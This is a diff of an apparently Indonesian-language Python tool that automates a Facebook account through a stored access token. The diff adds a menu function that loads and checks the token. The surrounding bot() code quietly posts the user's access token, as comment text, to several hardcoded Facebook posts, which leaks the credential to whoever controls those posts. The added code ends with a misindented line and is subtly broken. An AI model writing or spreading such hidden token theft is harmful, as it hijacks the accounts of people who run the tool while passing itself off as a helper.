@@ -128,3 +128,22 @@ def bot():
 	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
 	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
 	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)
+
+### BAGIAN MENU ###
+def menu():
+    global token
+    os.system('clear')
+    try:
+        token = open('token.txt', 'r').read()
+        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
+        a = json.loads(otw.text)
+        nama = a['name']
+    except (KeyError, IOError):
+        os.system('clear')
+        print("\n %s[!] token kadaluwarsa!"%(M))
+        os.system('rm -f token.txt')
+        tokenz()
+    except requests.exceptions.ConnectionError:
+        exit(" %s[!] anda tidak terhubung ke internet!"%(M))
+
+  logo()
